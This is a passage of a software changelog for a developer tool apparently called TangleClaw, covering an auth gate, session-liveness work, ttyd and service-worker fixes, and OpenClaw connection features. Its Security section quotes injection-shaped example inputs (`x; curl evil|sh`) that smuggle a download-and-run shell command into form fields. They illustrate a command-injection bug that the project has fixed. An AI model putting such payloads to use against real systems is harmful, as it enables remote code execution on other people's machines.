- **AUTH-2 documentation + verification (slice 4, closes the AUTH-2 chunk).** Captures the now-shipped login gate in the durable docs: **ADR 0004** (`docs/adr/0004-auth-2-basic-auth-gate.md`) records the decision — gate = Caddy `basic_auth`, no default credentials + forced first-run admin step, wizard-persists / cutover-activates, terminal-only break-glass — with Authelia (no macOS binary; refuses localhost cookie domain) and caddy-security/Path B (compile-time xcaddy/Go ripple; deferred as the multi-user/MFA upgrade) recorded as considered alternatives. `SECURITY.md`'s "Security Model" replaces the old *No User Authentication* section with the optional-gate model (no defaults, password rules, hash-not-plaintext, no-permanent-lockout, Basic Auth limitations) and folds the AUTH-1 ingress into an "HTTPS / Ingress" subsection. `.prawduct/artifacts/operational-spec.md` gains the gate in the ingress section, the `authEnabled`/`basicAuthUser`/`basicAuthHash` config fields, a break-glass entry under Backup & Recovery, and four auth-gate troubleshooting items. The live login round-trip (a real browser carrying the credential on the WS upgrade, weak-password rejection, `/api/health` staying public, break-glass after a simulated lockout) is enqueued as **`VRF-auth-2-login`** in the operator-verification queue. Docs + verification only — no product code change (hence `### Internal`); the gate behavior shipped in slices 1–3.
- **Caddyfile generator can emit a `basic_auth` gate (AUTH-2 slice 1, Path A foundation).** `lib/caddy.js` `buildCaddyfileContent` now accepts `basicAuthUser` + `basicAuthHash` (a bcrypt hash — never a plaintext password); when both are set it injects a `basic_auth` block into **every** site block (the local mkcert site and the public ACME site) guarding all paths **except `/api/health`** — via a `@protected not path /api/health` matcher placed before `reverse_proxy` — so the cutover's health probe and any launchd/liveness check reach TC unauthenticated. The credential is **both-or-neither**: a half-set pair throws rather than silently emitting an UNGATED ingress (fail closed on a reachable box). With no credentials the output is **byte-identical** to AUTH-1, so the integrity hash and every existing generated Caddyfile are unchanged. A generated *gated* file still verifies as TangleClaw-generated (`isGeneratedCaddyfile` → true), so a future cutover **reproduces** the operator's auth block instead of only refusing to clobber it — the generator-owns-the-auth-block half that #397's Fixed entry deferred to AUTH-2. **No operator-visible change yet** — nothing wires config or the cutover to pass the credential (that's AUTH-2 slice 2: config fields + the forced first-run admin wizard hashing via `caddy hash-password`), hence `### Internal`. **Tests:** +7 in `test/caddy.test.js` (gate over local + public sites, `basic_auth` precedes `reverse_proxy`, `/api/health` bypass, ungated-by-default, both-or-neither fail-closed ×2, gated file still integrity-stamped) plus a real `caddy validate` (v2.11.4) confirming the `basic_auth @protected` syntax adapts. Spec: `.prawduct/artifacts/auth-2-authelia-gate.md` (Path A build step 1).
- **Clean-room VRF runbook for the AUTH-1 cutover (`deploy/VRF-auth-1-cutover.md`).** Step-by-step procedure to smoke-test the #397 production-durability fixes (cert-staging, ttyd stale-socket, Caddyfile clobber-guard) plus the first-run Setup Wizard on a **fresh, throwaway install on a second Mac** — the only no-code-change clean room, since TC's `~/.tangleclaw/` home, SQLite DB, Caddyfile, and launchd labels are global per user account. Doubles as the standing test bed for the AUTH-2 admin-gate wizard once built. Doc-only; no product behavior change.
- **Dedup the session-result sort comparator + `unindexed`-meta builder in `lib/continuity.js` (CON-1R6D).** Three identical inline `sort` callbacks (`listSessions`, `searchSessions`, `searchProjectTranscripts`) ranked results recency-desc → match-count-desc → sid, and two call sites rebuilt the forward-only `unindexed: {type, file}` meta block inline. Extracted into two shared private helpers — `_byRecencyMatchSid(a, b)` and `_unindexedMeta(sessions)`. The unified comparator is behavior-identical at all three sites: `listSessions` records carry no `matchCount`, so that tier is a no-op there (`undefined !== undefined` is false) and the order collapses to the prior recency→sid. Pure behavior-preserving refactor — no API, schema, or output change. **Tests:** existing continuity/api-continuity suites pass unchanged (the contract for a refactor); added one characterization test pinning the match-count tiebreaker (same date, lower sid with more matches must sort first) — the one comparator sub-behavior the recency-only tests didn't cover, now that all three sites share one helper.
- **Accurate remote (ClawBridge) session liveness — async probe (#364 / #347 Slice 2b).** `lib/session-ownership.js` gains `probeLiveness(session)` and `listLiveProbed()` — the accurate-liveness path #364 needs, built on B0's `clawbridge.getStatus`. For a remote `openclaw` session the probe asks the bridge whether the session is actually live (`200 + active:false` = a confirmed-dead session, not a db false-positive); an **unreachable** bridge falls back to the db signal (`source:'db'`) — never a fabricated "dead". **Async by necessity** (a remote probe is a network round-trip), so it's a *separate path* from the synchronous `_liveness`/`listLive`: the prime-generation scope guard and the migration live-check stay on the fast, honestly-labeled db signal and never block on a slow/hung bridge, while enumeration consumers that can await (Project Master #331, Switchboard #333) get accuracy via `listLiveProbed` (probes remote entries concurrently, returns only confirmed-live tabs — a stale local pane-gone row and a bridge-dead remote row are both dropped). This **deviates from #364's literal "replace the db-only branch in `_liveness`"** on purpose — putting a per-sibling HTTP call on the synchronous launch hot path would let one hung bridge stall every launch. No consumer wired yet (so `### Internal`, no user-visible change); ClawBridge v1.7.1's `GET /v2/session/status` is what unblocked this (the #364 premise that no status endpoint existed was stale). **Tests:** +8 in `test/session-ownership.test.js` (probe: bridge-live/bridge-dead/unreachable-fallback/no-bridge-port/local-delegates/throws-fallback; `listLiveProbed`: drops bridge-dead keeps live local+remote, retains unreachable via db).
- **ClawBridge client — `send` / `getOutput` / `getStatus` foundation (CC-7 Slice B, B0).** `lib/clawbridge.js` (previously only `startSession`) gains thin clients for ClawBridge v1.7.1's PTY-broker contract: `send` (`POST /v2/session/send` — the gateway analog of `tmux.sendKeys`), `getOutput` (`GET /v2/session/output?cursor=N` cursor-based, auto-extends the HTTP timeout past `waitMs` for long-poll — the analog of `capturePane`), and `getStatus` (`GET /v2/session/status` — accurate remote liveness, the 200+`active:false` "no live session" signal **#364** needs). A shared `_requestJson` helper carries the resolve-never-reject posture (a bridge failure degrades the caller, never crashes it); `_queryString` keeps a falsy `cursor=0`. **No consumer yet** — the `ai-content`-over-gateway wiring is deliberately paused (the spike found the remote AI's `captureFile` lands on a different filesystem and the PTY renders `##` away — capture-back needs a render-surviving sentinel contract + a live OpenClaw spike; see `.prawduct/artifacts/cc-7-degraded-wrap.md` Slice B). Hence `### Internal`: net-new client surface, zero user-visible behavior change. **Tests:** +11 in `test/clawbridge.test.js` (send happy/404/409/network, getOutput events/cursor-0-preserved/pendingPermission/error, getStatus active/no-session-liveness/unreachable, `_queryString`).
- **Session-ownership primitive — Slice 1: local read-side object (#347).** A first-class, queryable `session ⇒ owned project` object, built once and shared so its three 4.0 consumers — #340 (scope guard), #333 (Switchboard routing), #331 (Project Master enumeration) — read the same object instead of each growing a subtly-incompatible one. New `lib/session-ownership.js` exposes `resolveBySessionId` / `resolveByProject` / `listLive`, each returning a structured, host-qualified address (`host/project#sessionId`) **derived, not persisted** — no schema migration: the lock-in decision was to reuse `sessions.id` as the stable, N-ready handle key and add no column until a consumer proves it needs one. **Local** (tmux) sessions get accurate liveness confirmed against the session's own tmux handle (the process must exist, not merely have an `active` DB row); a paneless local session and the `webui` transport fall back to db liveness, and `resolveByProject` resolves the live session (`active` OR `wrapping`, consistent with `listLive`/`resolveBySessionId` — the mid-wrap case #340 needs). **Remote** `openclaw:<connId>` sessions are still enumerated (never silently dropped) but carry db-only liveness and the connection's `host` read **as-is** (the Tailscale Magic DNS value the operator configured — the primitive never mints or normalizes an IP). **Slice 2a** now resolves the local host to the machine's real Tailscale Magic DNS name (`tailscale status --json` → `.Self.DNSName`, trailing-dot-stripped + lowercased; falls back to the OS hostname, then `localhost`; memoized for the process and probed at most once). **Slice 2b** (accurate ClawBridge *remote* liveness, replacing the db-only signal) is **blocked** on a ClawBridge session-status contract — `lib/clawbridge.js` exposes only `startSession` and the bridge's server contract lives in a separate repo — so remote liveness stays db-only for now (tracked separately, not silently dropped). **Slice 3** injects the owned-project identity (project + host + transport) into every session's prime via `generatePrimePrompt` (`lib/sessions.js`), so a consumer like #340's scope guard reads a reliable "what do I own" fact from hidden prime context — identity ONLY; the wrong-tab flagging behavior is #340's. The block carries pre-session facts (no `sessionId`, since the `sessions` row is created after the prime is written). Two additive store reads back it: `store.sessions.get(id)` (any-status lookup, so a handle resolves even after a session ends) and `store.sessions.listLiveAll()` (fleet-wide `active`+`wrapping`; `wrapping` counts as live — the agent is still running during wrap). No operator-visible behavior change — nothing consumes the primitive yet (hence `### Internal`). **Tests.** New `test/session-ownership.test.js` (26) + a `generatePrimePrompt` ownership-block assertion in `test/sessions.test.js`: local/remote resolve + address shape, unknown-id/no-active/unknown-project null paths, tmux-confirmed liveness (dead-tmux false, tmux-consulted, remote-must-not-consult-tmux), missing-connection `host:null` + `unknown/` handle, `listLive` active+wrapping included / ended excluded / project-row-gone skipped, the two store additions, plus Slice-2a Magic-DNS parse/strip/lowercase, null-on-unparseable, never-throws-when-absent, hostname + localhost fallbacks, memoization, and address-reflects-Magic-DNS; plus Slice-3 primeSection (names owned project/host/transport, openclaw transport, Magic-DNS host, empty-for-nameless-project, and an identity-only guard asserting no flagging directive leaks in). Discovery + decisions captured in `.prawduct/artifacts/session-ownership-primitive.md`.
- **TC's own dev governance migrated from vendored Prawduct V1 to the live V2 plugin (#330).** TangleClaw now dogfoods the [`brookstalley/prawduct`](https://github.com/brookstalley/prawduct) V2 Claude Code plugin (pinned `v2.1.5`, `autoUpdate:false`, enabled for **this repo only** via `.claude/settings.json` — the global install stays disabled so no other project is touched). The `/prawduct:migrate` cutover removed the committed V1 framework — `tools/product-hook` (the ~4,200-line vendored Stop-hook governance script) and all 14 `tools/lib/*.py` — and added a thin `PRAWDUCT:ANCHOR` section to `CLAUDE.md` plus the gitignored install marker. **12,088 deletions / 28 insertions** of tracked content. No change to TC's *product* behavior: the methodology TC generates for other projects (`data/templates/prawduct/template.json`) is untouched, so the platform still ships V1-style governance to non-migrated repos (the hybrid). Builds on the deferral landed above — TC detects its own plugin install reference and stops regenerating its governance config. Full suite **2773 pass / 0 fail / 1 pre-existing skip** after the cutover.

### Fixed

- **Caddy ingress cutover is now production-durable (#397, gates AUTH-1 #395).** The live `VRF-auth-1-cutover` surfaced three ways the AUTH-1 cutover failed as shipped; all three are fixed in `lib/caddy.js` + `scripts/ingress-cutover.js` + the ttyd launch path. **(1) Cert under a TCC-protected dir.** The launchd Caddy binary has no Full Disk Access, so a cert under `~/Documents` (the operator's mkcert cert, or `getCertsDir()`) silently stalled — Caddy logged `started background certificate maintenance` and never bound `:8443`/`:8080`. The cutover now **stages** the resolved cert+key into the non-TCC store dir (`~/.tangleclaw/certs/`, key `0600`, cert `0644`, overwritten each cutover so rotation propagates, self-copy-safe when the source already lives there) via new `caddy.stageCert()` and points the Caddyfile at the staged paths. **(2) ttyd stale Unix socket on restart.** The cutover unlinked the socket, but KeepAlive/reboot restarts did not → a stale inode made every terminal come up dead until a manual `rm`. The ttyd launchd job's **program** is now `/bin/bash` (a non-TCC system binary) carrying the unlink inline from argv — `if [ -n "$TTYD_SOCKET" ]; then rm -f "$TTYD_SOCKET"; fi; exec "$@"` — before `exec`'ing the ttyd binary, so every restart path self-heals (the unlink is a no-op in direct mode where `TTYD_SOCKET` is empty). The program is deliberately a system binary, **not** a repo-resident wrapper script: the live VRF caught that a launch script under `~/Documents` (the documented clone location) is un-launchable — `exit 126` — because a launchd-spawned process there lacks Full Disk Access (the node server agent survives only because *its* program is the node binary, outside the protected tree). Inlining from argv reads no protected file, so `/bin/bash` and the ttyd binary — both non-TCC — start regardless of where the repo lives. **(3) Cutover clobbered a hand-edited Caddyfile.** Regeneration was unconditional and would wipe an operator's `basic_auth` block + password, locking them out remotely. Generated Caddyfiles now carry a **sha256 of their body** stamped in the header; the cutover verifies it (`caddy.isGeneratedCaddyfile()`) and, when the body has been hand-edited (header-line alone is no longer enough — operators keep the header), **backs the file up (timestamped, so repeated runs never overwrite an earlier backup) and refuses to overwrite without `--force`**. The dry-run previews staging + the refuse decision. **Tests:** `test/caddy.test.js` (integrity check incl. the live header-kept-body-edited case, legacy-no-stamp, cert staging perms/rotation/self-copy), `test/ttyd-plist.test.js` (the exit-126 regression guard — launchd program is `/bin/bash`, never a `/deploy/` script; inline launcher execs the ttyd binary; behavioral unlink-on-set + no-op-when-empty by running the extracted argv command; `TTYD_SOCKET` templated, install.sh fills it empty), `test/ingress-cutover.test.js` (`--force` parse, per-mode `TTYD_SOCKET`, ttyd runs via `/bin/bash` not a wrapper). Verified live against the running hand-edited Caddyfile via dry-run (correctly refuses). The generator owning the `basic_auth`/remote block — so a future cutover *reproduces* the operator's config rather than only declining to clobber it — is AUTH-2, not this fix.
- **Service-worker updates now reach iOS Safari without a manual website-data clear (#380, layer 2).** iOS Safari stranded operators on a previously-installed service worker — surfaced as the opaque `FetchEvent.respondWith received an error: Returned response is null` when opening a session, because the *old* worker (pre-#380-fix) returned `caches.match()` → `undefined` on the uncacheable session-open POST. `updateViaCache:'none'` (#258), `skipWaiting()`, and `clients.claim()` were already present, but **nothing ever called `registration.update()` after the initial load**, and iOS only auto-checks for a new `/sw.js` on a full navigation (~every 24h at most) — so a long-lived tab / home-screen PWA never installed the fresh worker. Fix: the SW registration moved out of `landing.js`'s inline block into a new testable `public/sw-register.js` that (1) polls `reg.update()` on load **and on every `visibilitychange→visible`**, forcing the update check even on a long-lived iOS tab, and (2) reloads the page on `controllerchange` — **guarded** so it fires only when an *existing* controller is replaced (never on first install) and **at most once** (no reload loop). `sw-register.js` is dual-listed in `sw.js` (precached for `'/'` offline coherence + network-first as cache-bust-critical), and `CACHE_NAME` bumped `v3-22→v3-23` so the new `index.html` reaches active workers. The ttyd PTY-pool leak (#380's primary root cause — the reason session-open *fails in the first place* after multi-day uptime) is tracked separately. **Tests:** `test/sw-register.test.js` — register args, update-on-load, update-on-visibility, reload-on-controller-replace, no-reload-on-first-install, reload-at-most-once, and graceful no-op when service workers are unavailable / registration rejects.
- **ttyd PTY-leak watchdog now catches the leak signal it was missing (#380, primary root cause).** The ttyd watcher (`lib/ttyd-watcher.js`, #94/#144) recycles ttyd via `launchctl kickstart` when the PTY pool nears exhaustion — but it gated **only** on pool ratio (`used / kern.tty.ptmx_max ≥ 0.85`). Investigating #380's recurrence found ttyd holding **90 `tmux attach` children wedged in the kernel `E` (exiting) state** — each holding a `/dev/ttys*` slot, unreapable except by ttyd itself dying — at a pool ratio of only **0.45** (230 / 511), so the watcher stayed silent while session-open failed. Root cause: ttyd (1.7.7) spawns a `tmux attach` client per websocket (via `deploy/ttyd-attach.sh`) and frequently fails to reap it on disconnect; the count of leaked children, not the pool ratio, is the leading indicator. Fix: a **second, independent gate** — `_countTtydOrphans()` counts ttyd children in `E`/`Z` state and `_check` kickstarts when that reaches `DEFAULT_ORPHAN_THRESHOLD` (20, configurable via `start({orphanThreshold})`), regardless of pool ratio. The two gates are independent (a broken pool measurement no longer suppresses an orphan-driven kickstart). The kickstart is non-destructive — the tmux **server** sessions survive and clients auto-reconnect; only the leaked children are reaped (by reparenting to launchd). Surgical per-process reaping was rejected: an `E`-state process stuck for hours is wedged in the kernel and `SIGKILL` cannot free it — only the parent dying does. **Tests:** `test/ttyd-watcher.test.js` — `_countTtydOrphans` (E/Z counted, S/R ignored, cross-parent excluded, ps-error fail-safe, malformed rows) + `_check` orphan-gate (the #380 regression: kickstart at pool ratio 0.45 with 25 orphans; below-threshold no-op; orphan gate independent of a failed pool reading; custom + default threshold). The opaque-error and stale-SW halves of #380 shipped separately.
- **WebUI/OpenClaw sessions can now be wrapped (#334).** WebUI-launched sessions are recorded with `tmuxSession: null` (mode `webui`), but `triggerWrap`'s entry guard rejected any session without a tmux handle (`!active.tmuxSession` → "No active session") **before** the V2/legacy branch — so every webui session silently fell through the wrap gate: no L2 wrap pipeline, no hooks, no Critic. Root cause confirmed by reading the wrap path: the server-side **V2 pipeline (`_triggerWrapV2` → `runWrapPipeline`) is genuinely tmux-free**, but the shared entry guard blocked it, and separately the `ai-content` step hard-returned `blocked` on any missing tmux — and since prawduct's content `ai-content` steps (`changelog-update`/`learnings-capture`/`memory-update`) are `blocker: true`, a webui session reaching the pipeline would have **halted at the first one** before `commit`. Two changes: (1) `lib/sessions.js` — the wrap guard now rejects only on *no active session*, routing a webui session to the tmux-free V2 pipeline; the **legacy** NL-prompt path (which drives the AI via `tmux.sendKeys` and genuinely needs a pane) returns a clear *"WebUI/non-tmux session requires the V2 wrap pipeline (set wrapV2:true)"* error instead of crashing on a null pane. (2) `lib/wrap-steps/ai-content.js` — for a `sessionMode === 'webui'` session the step now **skips honestly** (`ok:true, status:'skipped'`) since there is no pane to drive (AI-authored memory/summary capture is N/A on the webui path for now — bridge-sourced capture is a future enhancement), while still **blocking** for the genuine anomaly of a non-webui session that lost its tmux. Honors CC-1's honest-empty floor (a flagged skip, never a fabricated capture). **Tests.** `test/sessions.test.js` — a webui session (null tmux) routes to the V2 pipeline with `ai-content` left real, asserting the pipeline runs to completion (`blockedAt: null`) with every `ai-content` step `skipped` (regresses loud if the skip is reverted, since blocker steps would then halt), plus the legacy-path clear-error case (no tmux send); `test/wrap-step-ai-content.test.js` — webui-mode skip (non-empty prompt isolates the guard from the empty-prompt skip below it), the preserved block for a non-webui null-tmux anomaly, and no-session block.
- **Wrap content steps fail loud instead of silently committing without them (#328).** The three prawduct `ai-content` content steps — `changelog-update`, `learnings-capture`, `memory-update` — were non-blockers, so when one timed out (the 300s idle cap) or failed validation it returned `ok:false` but the pipeline ran on to `commit` anyway: a complete-looking wrap landed with **no MEMORY.md refresh**. That's the bug behind the 2026-06-04 wrap, where `memory-update` showed `[Blocked] "AI did not return within 300s — wrap pipeline blocked"` yet `commit` showed `[Done]` right after (no data was lost only because MEMORY.md had been hand-authored before the wrap). Three changes: (1) the three content steps now declare **`blocker: true` + `allowOverride: true`**, so a failure **halts before `commit`** — no silent partial wrap; (2) the blocked step offers **Retry** (wait for the AI, then re-run) or a step-scoped **"Skip & note"** override (`options.skipAiContent[stepId]`, accumulated across retries, recorded in the commit body as `- AI content (<step>): skipped via user override`); (3) the timeout message no longer hardcodes the false **"wrap pipeline blocked"** claim (the handler can't know the pipeline's fate) — it names the step + "no idle detected" and carries an actionable `output.remediation`. No double-bump risk on Retry: `version-bump` stages in-memory and only `commit` flushes, so a halt evaporates staged writes and the retry re-derives from the working tree. **Tests.** `test/wrap-step-ai-content.test.js` (override skip + staging, accurate timeout message), `test/wrap-pipeline.test.js` (blocker:true ai-content halts before commit; `_buildBodyLines` skip line), `test/wrap-drawer.test.js` (ai-content decision widget + `skipAiContent` option collection). Docs: ADR 0002 step-kind table + amendment.

## [3.26.0] - 2026-06-04

### Added

- **version-bump: quiet skip + per-project opt-out for projects that manage their own versioning (#318).** When a project's `version.json`/`package.json` `version` isn't 3-part semver (e.g. TiLT v2's deliberate 4-segment `2.85.0.1`, produced by its own tooling), the wrap step used to skip with an alarming `"version" field missing or non-semver (got "…")` that read like breakage on every wrap. It now (1) skips with a **neutral, explanatory** reason — distinguishing a genuinely *missing* version from a *non-semver scheme TC simply doesn't drive* — and (2) honors a new per-project **`versionBumpEnabled`** flag (default **true**; only an explicit `false` disables). A self-versioned project can now turn TC's bump off via a **settings toggle** ("Auto version bump"), and the step skips with "version-bump disabled for this project (manages its own versioning)". Plumbed like `featureIndexEnabled` (store default → projects read/validate/persist → settings UI → step check). **Tests.** version-bump opt-out + neutral-message cases (`test/wrap-pipeline.test.js`, `test/version-bump-package-json.test.js`) and a `versionBumpEnabled` validation/persist/default block (`test/feature-index.test.js`).
- **Auto-detect OpenClaw Instance Dir over SSH — "Detect" button (#306-followup).** The connection form's Instance Dir field gains a **Detect** button: using the Host / SSH User / SSH Key Path already entered, TangleClaw SSHes to the host and discovers the OpenClaw stack directory automatically, so you don't have to hand it the path (the gap that kept the version display dark). One round-trip unions two strategies — the `com.docker.compose.project.working_dir` label of any running `*openclaw*` container (when docker is reachable to the SSH user), and a **bounded** scan of conventional locations for a `.env` declaring `OPENCLAW_IMAGE` (for hosts where the gateway runs as another user, cf. #297). New stateless endpoint `POST /api/openclaw/detect-instance-dir` (takes the SSH fields in the body, so it works in the Add form before the connection exists) backed by `lib/openclaw-detect.js`. The discovery script is fed to a remote `sh` over **stdin** (never interpolated), and host/user/key-path are shape-validated before any ssh runs — no command injection. **Tests.** New `test/openclaw-detect.test.js` (15): shape guards incl. injection attempts, output parsing/dedup, `~` key-path expansion, the script's dual strategy + no-unbounded-grep guard, the handler's unsafe/empty/success/ssh-failure paths, and the frontend Detect wiring.
- **OpenClaw Version row always renders in the connection detail list (#306).** Previously the `Version` row in an expanded OpenClaw connection card (`public/ui.js`) only appeared when the connection had an `instanceDir` configured — so connections without it showed no Version row at all, making the #296 version display look absent. The row is now unconditional: when `instanceDir` is set it shows the async-fetched OpenClaw image tag (unchanged), and when it isn't it shows a muted, actionable **"Set Instance Dir to enable"** hint with a tooltip explaining how to turn it on. The async version fetch still only runs for connections that have an `instanceDir` (the hint branch has no value to populate). New `.oc-detail-muted` style for the hint. **Tests.** New `test/openclaw-version-row.test.js` (5) locks the always-render label, both value branches, the fetch-guard, and the CSS rule.
- **OpenClaw "Read Me" setup-guide button next to + Add Connection (#306-followup).** A new **Read Me** button opens a modal that (1) explains what + Add Connection does and documents every field it asks for (Host, SSH User/Key, Gateway Port, CLI Command, Local/Bridge ports, **Instance Dir**, Available-as-engine), and (2) provides a copy-paste prompt — with a **Copy prompt** button — that you can hand to an AI agent setting up an OpenClaw instance. The agent sets the instance up TangleClaw-ready and reports back the form values, including the **Instance Dir** that enables the version display. The Instance Dir form-field label now reads "(recommended …)" and points at the Read Me. `docs/OPENCLAW-SETUP.md` gains an Instance Dir field-table row and an "About the version display" section (pinned-vs-moving-tag caveat, local-build tags). The modal is dismissed only by explicit user action (Close / backdrop), never on a timer. **Tests.** New `test/openclaw-setup-readme.test.js` (10) covers the button in both panel states, open/close/copy handlers, the no-timer guard, the modal markup + field list, the prompt's version-critical content, and the CSS.

### Fixed

- **OpenClaw tunnel health probes try both loopback families, fixing false "Gateway: FAIL" on IPv6-only local binds (#295).** `checkHealth` (the settings "test connection" probe) **and** `httpRoundTrip` (the #288 end-to-end liveness probe) both hardcoded `http://127.0.0.1:<localPort>` — the local-side analogue of the IPv6-only-binding problem #291 fixed for the *remote* forward target. When the local end of an `ssh -L` forward binds IPv6-only (`[::1]`), a perfectly healthy tunnel was reported dead. Both now route through a shared `_fetchLoopback` helper that probes `127.0.0.1` first (common case, no added latency) and falls back to `[::1]`, accepting whichever family answers — mirroring the existing `FORWARD_TARGETS` fallback for the remote side. The TCP bind-check (`tcpProbe`, defaulted to `127.0.0.1`) had the *same* IPv4-only assumption at every point it gates a probe or a result — the reuse pre-gate in `ensureTunnel`, `detectTunnel`, the post-spawn bind confirmation in `_spawnTunnelOnce` (where `ensureTunnel` hard-fails `ok:false` on `!bound` *before* the round-trip, so an IPv6-only fresh spawn was misreported as a bind failure), **and** the `killTunnelByPort` release-verification checks (which must not report a port released while an `[::1]` socket lingers — the #288-defect-2 false-success the surrounding comment warns against). All of these now route through a loopback-family-aware check (`_loopbackConnectable`). Every local-loopback probe and bind-check is fixed together so none is left on the IPv4-only assumption (symmetric-gate hygiene). **Tests.** New `loopback family fallback (#295)` block in `test/tunnel.test.js` — `checkHealth`, `httpRoundTrip`, and `detectTunnel` each find an `[::1]`-only-bound server, plus a both-families-dead negative — and an `ensureTunnel` "already-up on `[::1]`" case (all skip gracefully if the environment lacks IPv6 loopback).
- **`install.sh` no longer fails silently when the repo sits under a macOS TCC-protected folder (#324).** If the TC repo lives under `~/Documents`, `~/Desktop`, or `~/Downloads` and node lacks Full Disk Access, the launchd server hangs **silently** on startup — launchd-spawned node blocks in `uv_cwd` opening its working directory, with zero output (stderr went to `/dev/null`). This cost a multi-hour debugging session. Three changes: (1) a **Darwin-guarded preflight** detects the repo-under-protected-folder case and prints a heads-up naming the exact remedy (grant Full Disk Access to the *resolved* node binary — symlink resolved via node's own `realpathSync` since BSD `readlink` lacks `-f`); (2) when the post-reload health check fails in that situation, the script **escalates to a specific diagnosis** (the `uv_cwd` hang signature + the FDA fix) instead of the old generic "may not be ready"; (3) the server plist's `StandardErrorPath` now points at `~/.tangleclaw/logs/server.err.log` (created before load) instead of `/dev/null`, so a future startup crash leaves a breadcrumb. The preflight is non-blocking (many setups have already granted FDA, and `install.sh` may run non-interactively). **Tests.** New TCC-preflight block in `test/install-sh.test.js` (Darwin guard, three protected roots, FDA + resolved-node messaging, `TCC_PROTECTED`-gated failure diagnosis, log-dir creation, `set -u` init safety) and a server-plist assertion that stderr is no longer `/dev/null`.
- **Terminal scrollback survives reconnect / TC restart, and long output is reachable in a live session (#322, #290).** tmux always retained history (`history-limit 50000`, survives restarts — that's why Peek works), but on every re-attach ttyd handed the browser a *fresh, empty* xterm.js buffer and `tmux attach-session` only redrew the current viewport, so scrollback vanished on any reconnect, tab reload, or ttyd/TC restart. Additionally, ttyd's xterm scrollback sat at its 1000-line default, truncating long output mid-session. Two changes: (1) `deploy/ttyd-attach.sh` now replays the scrolled-off history into the buffer before attaching — `tmux capture-pane -e -p -S -10000 -E -1` (colors preserved; `-E -1` excludes the visible screen so the attach-redraw doesn't duplicate it; best-effort, never blocks the attach); (2) `deploy/com.tangleclaw.ttyd.plist` raises the xterm buffer via `--client-option scrollback=10000` so the live buffer is large enough and can hold the replay. **Tests.** New scrollback-replay assertions in `test/ttyd-attach.test.js` (replay precedes attach, colors + `-E -1`, best-effort) and a new `test/ttyd-plist.test.js` locking the scrollback client-option and the buffer ≥ replay-window invariant. **Note:** the plist change requires a `launchctl` reload of `com.tangleclaw.ttyd` (re-run `deploy/install.sh` or kickstart the service) to take effect; the attach-script change applies on the next terminal connection.
- **Methodology resolves from the DB (single source of truth), not a stale `project.json` (#320).** Two engine-config code paths resolved methodology as `projConfig.methodology || project.methodology` — **file-first** — while session launch (`sessions.js`) already trusted the DB's `project.methodology`. That asymmetry let a stale, git-tracked `.tangleclaw/project.json` override the server: TiLT v2 still shipped a legacy flat `methodology: "minimal"` (the minimal methodology was archived ~2 months prior) that contradicted the DB's `prawduct`, and `syncAllProjects` (every TC restart) would regenerate `CLAUDE.md` from the wrong template; the phase-update path had the same precedence. Both now read `project.methodology` directly, matching the session-launch path and closing the asymmetric-resolution gap. The file's `methodology` field is no longer read by any authoritative path (API responses already serialize from the DB row), so the server stays the single source of truth. **Tests.** New `syncAllProjects` regression case in `test/projects.test.js`: DB `prawduct` + a stale on-disk `minimal` → regenerated `CLAUDE.md` reflects Prawduct.
- **OpenClaw version display works for locally-built / custom-tagged images (#308).** `parseVersion` (`lib/openclaw-version.js`) required the `OPENCLAW_IMAGE` value to contain the canonical `openclaw/openclaw:` registry path, so an image like `openclaw:qmd` (a local build) failed to parse and the connection showed "unknown". It now extracts the tag generically — the substring after the reference's last `:`, unless that substring contains a `/` (a registry host:port, not a tag) — handling `ghcr.io/openclaw/openclaw:<tag>`, `openclaw:qmd`, `openclaw:latest`, and `registry:5000/openclaw:tag`. **Tests.** +4 regression cases (bare tag, custom registry, host:port guard, untagged ref).
- **Framework auto-sync no longer blocked by a phantom "rebase in progress" (#304).** `_git_op_in_progress` in `tools/lib/sync_cmd.py` treated the presence of `.git/REBASE_HEAD` as an in-progress rebase. Unlike `MERGE_HEAD`/`CHERRY_PICK_HEAD`/`REVERT_HEAD` (which git removes when the op ends or aborts), git *leaves `REBASE_HEAD` behind* after a rebase completes — it is only overwritten by the next rebase. So any repo that had ever rebased reported a phantom rebase forever, blocking auto-sync and sticking in the session briefing. Dropped `REBASE_HEAD` from the marker list; the existing `rebase-merge`/`rebase-apply` directory check (git's own authoritative test) keeps genuine in-progress rebases covered.
- **priming-roll wrap step no longer BLOCKS a clean wrap when `.claude/plans/` has no active plan (#302).** When every build plan has been archived to `.claude/plans/archive/` (per CLAUDE.md's plan-archiving rule), the active plans dir is empty — there is no pointer to roll. `_resolvePlanPath` already treated the conceptually-identical "several plans, none in-progress" case as a clean **skip** (`priming-roll.js`), but the zero-plans branch returned a bare error with no `skip` flag, so the handler fell through to **BLOCKED**. Every clean wrap on a fully-shipped project showed a spurious red BLOCKED row. The empty-dir branch now mirrors its sibling and skips with a "nothing to roll" reason. The non-recursive `.md` filter already ignored the `archive/` subdir, so archived plans were never miscounted — the only defect was the missing skip flag. **Tests.** Updated the now-inverted "empty plans dir" case and added a regression test reproducing the exact reported scenario (all plans under `archive/`, empty top level → skips).

### Security

- **`POST /api/openclaw/test` now validates all shell-interpolated fields before shelling out (#312).** The connection form's *Test Connection* endpoint interpolated `host`/`sshUser`/`sshKeyPath` into an `ssh …` command **and** `port`/`localPort` into a `curl …:<port>/healthz` command, both run via `execSync` (`server.js`) with no validation — command-injection surfaces reachable from form input (e.g. `host = "x; curl evil|sh"` or `localPort = "1;curl evil|sh"`). It now rejects unsafe SSH-field shapes (reusing `openclaw-detect`'s `unsafeReason` guard — one source of truth, added in #311) and non-integer / out-of-range `port`/`localPort` with 400 before any shell-out. Surfaced by the Critic reviewing #311 (SSH triple) and #313 (the port fields). **Tests.** New regression cases in `test/api-openclaw.test.js` asserting injection-shaped `host`/`sshUser`/`sshKeyPath` and `port`/`localPort` each 400. (The version reader interpolates the SSH fields from *stored* connection records — lower exposure; noted in #312 for a follow-up.)
- **Version reader shape-validates its SSH fields too; shared validator extracted (#314, #312 follow-up).** `fetchVersion` (`lib/openclaw-version.js`) interpolated `conn.host`/`conn.sshUser`/`conn.sshKeyPath` into its `ssh …` command without validation — the same injection class as #312, but from *stored* connection records (which aren't shape-validated at write time) rather than direct form input. It now rejects unsafe-shaped targets (`version: null` + reason, no ssh attempted). The guards (`SAFE_HOST`/`SAFE_USER`/`SAFE_KEYPATH`/`unsafeReason`) are extracted into a new shared `lib/ssh-target-safety.js` so `openclaw-detect`, `openclaw-version`, and the `/api/openclaw/test` route share one source of truth (`openclaw-detect` re-exports `unsafeReason` for back-compat). **Tests.** New `test/ssh-target-safety.test.js` (7) for the shared validators, plus a version-reader injection-guard regression case.
